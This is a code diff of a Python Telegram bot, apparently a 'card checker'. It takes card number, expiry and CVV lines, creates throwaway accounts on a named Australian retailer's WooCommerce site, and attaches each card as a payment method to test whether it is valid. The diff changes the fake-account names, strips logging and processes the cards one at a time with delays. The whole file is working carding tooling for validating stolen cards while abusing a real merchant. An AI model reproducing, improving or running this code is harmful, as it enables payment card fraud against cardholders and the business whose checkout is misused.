@@ -1,10 +1,9 @@
 import os
 import re
 import time
-import random
 import json
+import random
 import asyncio
-import logging
 from html import unescape
 
 import httpx
@@ -15,11 +14,6 @@ from telegram.ext import (
     MessageHandler,
     filters,
     ContextTypes,
-)
-
-logging.basicConfig(
-    format='%(asctime)s - %(levelname)s - %(message)s',
-    level=logging.INFO
 )
 
 # Helper function to extract substring between start and end
@@ -35,9 +29,9 @@ def gets(s: str, start: str, end: str) -> str | None:
 async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
     try:
         cc, mes, ano, cvv = fullz.split("|")
-        user = "renasenomann" + str(random.randint(9999, 574545))
-        mail = "renasenomann" + str(random.randint(9999, 574545)) + "@gmail.com"
-        pwd = "Renasenomann" + str(random.randint(9999, 574545))
+        user = "paraelsan" + str(random.randint(9999, 574545))
+        mail = "paraelsan" + str(random.randint(9999, 574545)) + "@gmail.com"
+        pwd = "Paraelsan" + str(random.randint(9999, 574545))
 
         # Validate expiration date
         mes = mes.zfill(2)
@@ -54,13 +48,12 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
             return json.dumps({"error": {"message": "Invalid expiry date"}})
 
         if expiry_month < 1 or expiry_month > 12:
-            return json.dumps({"error": {"message": "Expiration Month Invalid"}})
+            return json.dumps({"error": {"message": "Expiration Month Invalid ❌"}})
         if expiry_year < current_year:
-            return json.dumps({"error": {"message": "Expiration Year Invalid"}})
+            return json.dumps({"error": {"message": "Expiration Year Invalid ❌"}})
         if expiry_year == current_year and expiry_month < current_month:
-            return json.dumps({"error": {"message": "Expiration Month Invalid"}})
+            return json.dumps({"error": {"message": "Expiration Month Invalid ❌"}})
 
-        # Request headers etc.
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
@@ -81,7 +74,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         response = await session.get('https://thefloordepot.com.au/my-account/', headers=headers)
 
         register = gets(response.text, '"woocommerce-register-nonce" value="', '" />')
-        #print(register)
+        print(register)
 
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -119,7 +112,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         response = await session.get('https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers)
 
         nonce = gets(response.text, '"add_card_nonce":"', '"')
-        #print(nonce)
+        print(nonce)
 
         headers = {
             'accept': 'application/json',
@@ -159,7 +152,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
 
         try:
             id = response.json()['id']
-            #print(id)
+            print(id)
         except Exception:
             return response.text
 
@@ -194,7 +187,6 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         return response.text
 
     except Exception as e:
-        logging.error(f"create_payment_method error: {str(e)}")
         return f"Exception: {str(e)}"
 
 # Function maps API response text to friendly message
@@ -308,7 +300,6 @@ async def charge_resp(result):
 
         return response
     except Exception as e:
-        logging.error(f"charge_resp error: {str(e)}")
         return f"{str(e)} ❌"
 
 # Combines create_payment_method + charge_resp + measure time
@@ -359,13 +350,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     )
 
 async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    text = update.message.text.strip()
+    lines = [line.strip() for line in text.splitlines() if line.strip()]
+
+    msg = await update.message.reply_text("PROCESSING YOUR CARD, PLEASE WAIT...", parse_mode='HTML')
+
     try:
-        text = update.message.text.strip()
-        lines = [line.strip() for line in text.splitlines() if line.strip()]
-
-        await update.message.reply_text("PROCESSING YOUR CARD, PLEASE WAIT...", parse_mode='HTML')
-
-        tasks = []
         for line in lines:
             parts = line.split("|")
             if len(parts) != 4:
@@ -381,20 +371,14 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
             cc_formatted = f"{cc_num}|{month}|{year}|{cvv}"
 
-            # Buat task async checking
-            tasks.append(multi_checking(cc_formatted))
+            # Optional sleep if you want to add delay (can be removed for speed)
+            await asyncio.sleep(3)
 
-        results = await asyncio.gather(*tasks, return_exceptions=True)
+            result = await multi_checking(cc_formatted)
+            await update.message.reply_text(result, parse_mode='HTML')
 
-        for result in results:
-            if isinstance(result, Exception):
-                logging.error(f"Error in task: {str(result)}")
-                await update.message.reply_text(f"Error: {str(result)}")
-            else:
-                await update.message.reply_text(result, parse_mode='HTML')
-
+        await msg.delete()
     except Exception as e:
-        logging.error(f"Error in handle_cc_message: {str(e)}")
         await update.message.reply_text(f"ERROR: {str(e)}")
 
 def main() -> None:
@@ -403,9 +387,8 @@ def main() -> None:
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_cc_message))
 
-    logging.info("PARAEL CHECKER BOT RUNNING...")
+    print("PARAEL CHECKER BOT RUNNING...")
     application.run_polling()
 
 if __name__ == "__main__":
     main()
-
